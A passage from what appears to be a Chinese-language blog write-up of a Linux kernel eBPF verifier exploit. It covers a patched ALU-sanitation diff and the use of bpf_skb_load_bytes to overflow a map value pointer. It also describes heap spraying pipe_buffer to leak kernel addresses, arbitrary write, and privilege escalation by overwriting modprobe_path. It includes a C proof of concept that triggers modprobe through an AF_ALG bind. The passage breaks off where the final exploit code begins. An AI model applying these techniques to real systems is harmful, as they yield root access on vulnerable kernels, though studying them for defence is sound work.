<span class="built_in">abs</span>(tmp_aux-&gt;alu_limit - alu_limit);</span></span><br><span class="line"><span class="params">+	&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="params">+		alu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : <span class="number">0</span>;</span></span><br><span class="line"><span class="params">+		alu_state |= ptr_is_dst_reg ?</span></span><br><span class="line"><span class="params">+			     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;</span></span><br><span class="line"><span class="params">+	&#125;</span></span><br><span class="line"><span class="params">+</span></span><br><span class="line"><span class="params"> 	err = update_alu_sanitation_state(aux, alu_state, alu_limit);</span></span><br><span class="line"><span class="params"> 	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params"> 		<span class="keyword">return</span> err;</span></span><br><span class="line"><span class="params"> do_sim:</span></span><br><span class="line"><span class="params">+	<span class="comment">/* If we&#x27;re in commit phase, we&#x27;re done here given we already</span></span></span><br><span class="line"><span class="comment"><span class="params">+	 * pushed the truncated dst_reg into the speculative verification</span></span></span><br><span class="line"><span class="comment"><span class="params">+	 * stack.</span></span></span><br><span class="line"><span class="comment"><span class="params">+	 */</span></span></span><br><span class="line"><span class="params">+	<span class="keyword">if</span> (commit_window)</span></span><br><span class="line"><span class="params">+		<span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="params">+</span></span><br><span class="line"><span class="params"> 	<span class="comment">/* Simulate and find potential out-of-bounds access under</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	 * speculative execution from truncation as a result of</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	 * masking when off was not within expected range. If off</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -6130,6 +6139,7 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;</span></span></span><br><span class="line"><span class="comment"><span class="params">+	struct bpf_insn_aux_data tmp_aux = &#123;&#125;;</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	u8 opcode = BPF_OP(insn-&gt;code);</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	u32 dst = insn-&gt;dst_reg;</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	int ret;</span></span></span><br><span class="line"><span class="comment"><span class="params">@@ -6196,12 +6206,15 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="comment"><span class="params"> 	/* pointer types do not carry 32-bit bounds at the moment. */</span></span></span><br><span class="line"><span class="params"> 	__mark_reg32_unbounded(dst_reg);</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">-	<span class="keyword">switch</span> (opcode) &#123;</span></span><br><span class="line"><span class="params">-	<span class="keyword">case</span> BPF_ADD:</span></span><br><span class="line"><span class="params">-		ret = sanitize_ptr_alu(env, insn, ptr_reg, off_reg, dst_reg);</span></span><br><span class="line"><span class="params">+	<span class="keyword">if</span> (sanitize_needed(opcode)) &#123;</span></span><br><span class="line"><span class="params">+		ret = sanitize_ptr_alu(env, insn, ptr_reg, off_reg, dst_reg,</span></span><br><span class="line"><span class="params">+				       &amp;tmp_aux, <span class="literal">false</span>);</span></span><br><span class="line"><span class="params"> 		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params"> 			<span class="keyword">return</span> sanitize_err(env, insn, ret, off_reg, dst_reg);</span></span><br><span class="line"><span class="params">+	&#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">+	<span class="keyword">switch</span> (opcode) &#123;</span></span><br><span class="line"><span class="params">+	<span class="keyword">case</span> BPF_ADD:</span></span><br><span class="line"><span class="params"> 		<span class="comment">/* We can take a fixed offset as long as it doesn&#x27;t overflow</span></span></span><br><span class="line"><span class="comment"><span class="params"> 		 * the s32 &#x27;off&#x27; field</span></span></span><br><span class="line"><span class="comment"><span class="params"> 		 */</span></span></span><br><span class="line"><span class="params">@@ <span class="number">-6252</span>,<span class="number">10</span> +<span class="number">6265</span>,<span class="number">6</span> @@ <span class="type">static</span> <span class="type">int</span> adjust_ptr_min_max_vals(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params"> 		&#125;</span></span><br><span class="line"><span class="params"> 		<span class="keyword">break</span>;</span></span><br><span class="line"><span class="params"> 	<span class="keyword">case</span> BPF_SUB:</span></span><br><span class="line"><span class="params">-		ret = sanitize_ptr_alu(env, insn, ptr_reg, off_reg, dst_reg);</span></span><br><span class="line"><span class="params">-		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params">-			<span class="keyword">return</span> sanitize_err(env, insn, ret, off_reg, dst_reg);</span></span><br><span class="line"><span class="params">-</span></span><br><span class="line"><span class="params"> 		<span class="keyword">if</span> (dst_reg == off_reg) &#123;</span></span><br><span class="line"><span class="params"> 			<span class="comment">/* scalar -= pointer.  Creates an unknown scalar */</span></span></span><br><span class="line"><span class="params"> 			verbose(env, <span class="string">&quot;R%d tried to subtract pointer from scalar\n&quot;</span>,</span></span><br><span class="line"><span class="params">@@ <span class="number">-6338</span>,<span class="number">6</span> +<span class="number">6347</span>,<span class="number">12</span> @@ <span class="type">static</span> <span class="type">int</span> adjust_ptr_min_max_vals(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> 	<span class="keyword">if</span> (sanitize_check_bounds(env, insn, dst_reg) &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params"> 		<span class="keyword">return</span> -EACCES;</span></span><br><span class="line"><span class="params">+	<span class="keyword">if</span> (sanitize_needed(opcode)) &#123;</span></span><br><span class="line"><span class="params">+		ret = sanitize_ptr_alu(env, insn, dst_reg, off_reg, dst_reg,</span></span><br><span class="line"><span class="params">+				       &amp;tmp_aux, <span class="literal">true</span>);</span></span><br><span class="line"><span class="params">+		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params">+			<span class="keyword">return</span> sanitize_err(env, insn, ret, off_reg, dst_reg);</span></span><br><span class="line"><span class="params">+	&#125;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> 	<span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="params"> &#125;</span></span><br></pre></td></tr></table></figure>

<p>alu_limit 的计算方式发生了改变，不是使用指针寄存器的当前位置，而是使用一个 offset 寄存器<br>被认为是常数的寄存器赋值会被直接更改为常量赋值  </p>
<p>这个时候我们可以利用 bpf_skb_load_bytes 这个函数  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">bpf_skb_load_bytes</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *skb, u32 offset, <span class="type">void</span> *to,</span></span><br><span class="line"><span class="params">u32 len)</span></span><br><span class="line"></span><br><span class="line">        Description</span><br><span class="line">            This helper was provided as an easy way to load</span><br><span class="line">            data from a packet. It can be used to load len</span><br><span class="line">            bytes from offset from the packet associated to</span><br><span class="line">            skb, into the buffer pointed by to.</span><br><span class="line"></span><br><span class="line">            Since Linux 4.7, usage of this helper has mostly</span><br><span class="line">            been replaced by &quot;direct packet access&quot;, enabling</span><br><span class="line">            packet data to be manipulated with skb-&gt;data and</span><br><span class="line">            skb-&gt;data_end pointing respectively to the first</span><br><span class="line">            byte of packet data and to the byte after the last</span><br><span class="line">            byte of packet data. However, it remains useful <span class="keyword">if</span></span><br><span class="line">            one wishes to read large quantities of data at once</span><br><span class="line">            from a packet into the eBPF <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">        Return 0 on success, or a negative error in <span class="keyword">case</span> of</span><br><span class="line">            failure.</span><br></pre></td></tr></table></figure>

<p>bpf_skb_load_bytes 函数可以将 map 中的数据拷贝到 eBPF 的栈上，且长度可控。我们可以将 epbf_map 的 value 指针保存在 eBPF stack 上然后利用 victim_reg 构造一个非法的 size 令 bpf_skb_load_bytes 在拷贝时出现越界进而修改 value 指针。  </p>
<p>我们知道 value 指针是指向 bpf_array 的下方的 value，而这个地址是在堆上的。我们暂时不管 bpf_array 是在哪个 kmem_cache 中分配的，我们直接把目光放向别的 kmem_cache  </p>
<p>上面我们分析过 bpf_array 的 size 是可控的，也就是说我们可以令这玩意分配到几乎所有我们想要的 order 上（附近有结构体那种😇🤣），而我们可以在与这个 bpf_array 的 slab 相邻的 page 上喷任何我们想要的结构体（对于不同 order 的结构体我们可以相应的修改 bpf_array 的 order 使之与之相邻）  </p>
<p>这时候我们利用 bpf_skb_load_bytes 的溢出修改 value 指针的低 2 位为 \x?0\x00（?的取值为 0-15，这里循环修改 16次），在进行合理的页风水的情况下我们可以接近百分百的让 value 指向我们想要命中的结构体，进而利用 bpf_map_lookup_elem 从 value 中读取我们要泄露的地址信息。这里笔者选择在 bpf_array 附近喷 pipe_buffer，并通过泄露 pipe_buf_operations 进而泄露出内核的地址（当然也可以进行写操作）。总流程如下图：  </p>
<img src="/2025/07/24/ebpf/2.png" class="" title="我的图图呢"> 

<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>在利用上面的方法泄露出地址后我们就可以顺理成章的利用 bpf_skb_load_bytes 将 value 覆盖为我们想要进行写入的地址即可，easy :)  </p>
<p>这里我选择修改 modprobe 来进行提权，因为在 6.15+ 的 kernel 中 modprobe 的触发方式有所改变，所以这里为了所谓的 “绕远路” 所以选这了这个方法（其实笔者更想通过修改 PTE 来现在内核任意物理地址级别的读写）</p>
<h2 id="高版本modprobe"><a href="#高版本modprobe" class="headerlink" title="高版本modprobe"></a>高版本modprobe</h2><p>在高版本的内核中存在下面这个 patch：  </p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">diff --git a/fs/exec.c b/fs/exec.c</span></span><br><span class="line"><span class="comment">index 4057b8c3e23391..e0435b31a811af 100644</span></span><br><span class="line"><span class="comment">--- a/fs/exec.c</span></span><br><span class="line"><span class="comment">+++ b/fs/exec.c</span></span><br><span class="line"><span class="meta">@@ -1723,13 +1723,11 @@</span> int remove_arg_zero(struct linux_binprm *bprm)</span><br><span class="line"> &#125;</span><br><span class="line"> EXPORT_SYMBOL(remove_arg_zero);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-#define printable(c) (((c)==&#x27;\t&#x27;) || ((c)==&#x27;\n&#x27;) || (0x20&lt;=(c) &amp;&amp; (c)&lt;=0x7e))</span></span><br><span class="line"> /*</span><br><span class="line">  * cycle the list of binary formats handler, until one recognizes the image</span><br><span class="line">  */</span><br><span class="line"> static int search_binary_handler(struct linux_binprm *bprm)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-	bool need_retry = IS_ENABLED(CONFIG_MODULES);</span></span><br><span class="line"> 	struct linux_binfmt *fmt;</span><br><span class="line"> 	int retval;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -1741,8 +1739,6 @@</span> static int search_binary_handler(struct linux_binprm *bprm)</span><br><span class="line"> 	if (retval)</span><br><span class="line"> 		return retval;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-	retval = -ENOENT;</span></span><br><span class="line"><span class="deletion">- retry:</span></span><br><span class="line"> 	read_lock(&amp;binfmt_lock);</span><br><span class="line"> 	list_for_each_entry(fmt, &amp;formats, lh) &#123;</span><br><span class="line"> 		if (!try_module_get(fmt-&gt;module))</span><br><span class="line"><span class="meta">@@ -1760,17 +1756,7 @@</span> static int search_binary_handler(struct linux_binprm *bprm)</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	read_unlock(&amp;binfmt_lock);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-	if (need_retry) &#123;</span></span><br><span class="line"><span class="deletion">-		if (printable(bprm-&gt;buf[0]) &amp;&amp; printable(bprm-&gt;buf[1]) &amp;&amp;</span></span><br><span class="line"><span class="deletion">-		    printable(bprm-&gt;buf[2]) &amp;&amp; printable(bprm-&gt;buf[3]))</span></span><br><span class="line"><span class="deletion">-			return retval;</span></span><br><span class="line"><span class="deletion">-		if (request_module(&quot;binfmt-%04x&quot;, *(ushort *)(bprm-&gt;buf + 2)) &lt; 0)</span></span><br><span class="line"><span class="deletion">-			return retval;</span></span><br><span class="line"><span class="deletion">-		need_retry = false;</span></span><br><span class="line"><span class="deletion">-		goto retry;</span></span><br><span class="line"><span class="deletion">-	&#125;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-	return retval;</span></span><br><span class="line"><span class="addition">+	return -ENOEXEC;</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> /* binfmt handlers will call back into begin_new_exec() on success. */</span><br></pre></td></tr></table></figure>

<p>导致我们无法直接通过执行类似 <code>\xff\xff\xff\xff</code> 这样的命令来触发 modprobe_path :(<br>在 v6.14-rc1 之前的内核版本中，当用户尝试执行以幻数（例如 <code>\xff\xff\xff\xff</code>）开头的虚拟文件时，会触发以下调用堆栈：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sys_execve()</span><br><span class="line">  =&gt; do_execve()</span><br><span class="line">    =&gt; do_execveat_common()</span><br><span class="line">      =&gt; bprm_execve()</span><br><span class="line">        =&gt; exec_binprm()</span><br><span class="line">          =&gt; search_binary_handler()</span><br><span class="line">            =&gt; request_module()</span><br><span class="line">              =&gt; __request_module()</span><br><span class="line">                =&gt; call_modprobe()</span><br><span class="line">                  =&gt; call_usermodehelper_exec()</span><br><span class="line">                    =&gt; queue_work(call_usermodehelper_exec_work)</span><br><span class="line">[ kworker ]</span><br><span class="line">call_usermodehelper_exec_work()</span><br><span class="line">  =&gt; call_usermodehelper_exec_sync()</span><br><span class="line">    =&gt; call_usermodehelper_exec_async()</span><br><span class="line">      =&gt; kernel_execve()</span><br></pre></td></tr></table></figure>

<p>在调用堆栈中，call_modprobe 从全局变量 modprobe_path 中检索文件路径，然后调用 call_usermodehelper_exec，在用户空间的指定路径处执行文件  </p>
<p>查看这个 patch，调用 request_module 部分的代码已被完全删除，因此 search_binary_handler 不再调用 request_module</p>
<p>但我们依然能找到一些 syscall 可以调用它，Syzscope&#x2F;SyzBridge 就曾 fuzz 过：  </p>
<img src="/2025/07/24/ebpf/1.png" class="" title="我的图图呢"> 

<p>这里我们可以使用 AF_ALG socket，AF_ALG 是一个基于套接字的接口，允许用户空间访问内核的加密 API。当在此套接字上调用 bind 时，它会触发 alg_bind 函数。此函数搜索与用户提供的 sa-&gt;salg_type 相对应的类型，如果未找到，则调用 request_module 以尝试加载 “algif-%s” 模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">alg_proto_ops</span> =</span> &#123;</span><br><span class="line">        .family         =       PF_ALG,</span><br><span class="line">        .owner          =       THIS_MODULE,</span><br><span class="line">        ...</span><br><span class="line">        .bind           =       alg_bind,</span><br><span class="line">        .release        =       af_alg_release,</span><br><span class="line">        .setsockopt     =       alg_setsockopt,</span><br><span class="line">        .accept         =       alg_accept,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alg_bind</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="keyword">struct</span> sockaddr *uaddr, <span class="type">int</span> addr_len)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">const</span> u32 allowed = CRYPTO_ALG_KERN_DRIVER_ONLY;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alg_sock</span> *<span class="title">ask</span> =</span> alg_sk(sk);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_alg_new</span> *<span class="title">sa</span> =</span> (<span class="type">void</span> *)uaddr;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">af_alg_type</span> *<span class="title">type</span>;</span></span><br><span class="line">        <span class="type">void</span> *private;</span><br><span class="line">        <span class="type">int</span> err;</span><br><span class="line">        ...</span><br><span class="line">        sa-&gt;salg_type[<span class="keyword">sizeof</span>(sa-&gt;salg_type) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        sa-&gt;salg_name[addr_len - <span class="keyword">sizeof</span>(*sa) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        type = alg_get_type(sa-&gt;salg_type);   </span><br><span class="line">        <span class="keyword">if</span> (PTR_ERR(type) == -ENOENT) &#123;</span><br><span class="line">                request_module(<span class="string">&quot;algif-%s&quot;</span>, sa-&gt;salg_type);  </span><br><span class="line">                type = alg_get_type(sa-&gt;salg_type);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>poc 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">trigger_modprobe</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_alg</span> <span class="title">sa</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> alg_fd = socket(AF_ALG, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (alg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;socket(AF_ALG) failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.salg_family = AF_ALG;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)sa.salg_type, <span class="string">&quot;Qanux&quot;</span>);  <span class="comment">// dummy string</span></span><br><span class="line">    bind(alg_fd, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span 